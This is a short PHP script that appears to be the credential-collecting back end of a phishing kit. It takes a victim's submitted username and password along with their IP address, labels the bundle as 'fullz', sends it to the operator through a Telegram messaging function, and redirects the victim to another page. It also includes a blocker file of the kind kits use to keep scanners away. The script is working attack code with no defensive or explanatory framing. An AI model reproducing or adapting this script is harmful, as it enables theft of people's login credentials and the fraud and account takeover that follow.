<?php
// one.php file

include '../blocker.php';
include 'config.php';
$ip = getenv ("REMOTE_ADDR");
$message .= "Eeddd.-ca Username: " .$_POST['1']."\n\n";
$message .= "Password: " .$_POST['2']."\n\n";
$message .= "--------Eeddd---fullz--------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "--------Eeddd.-ca------\n";
$subject = "Eeddd Email And Password-Edd\r\n\r\n".$message;
send_telegram_msg($message);
header("Location: page.html");

?>
        

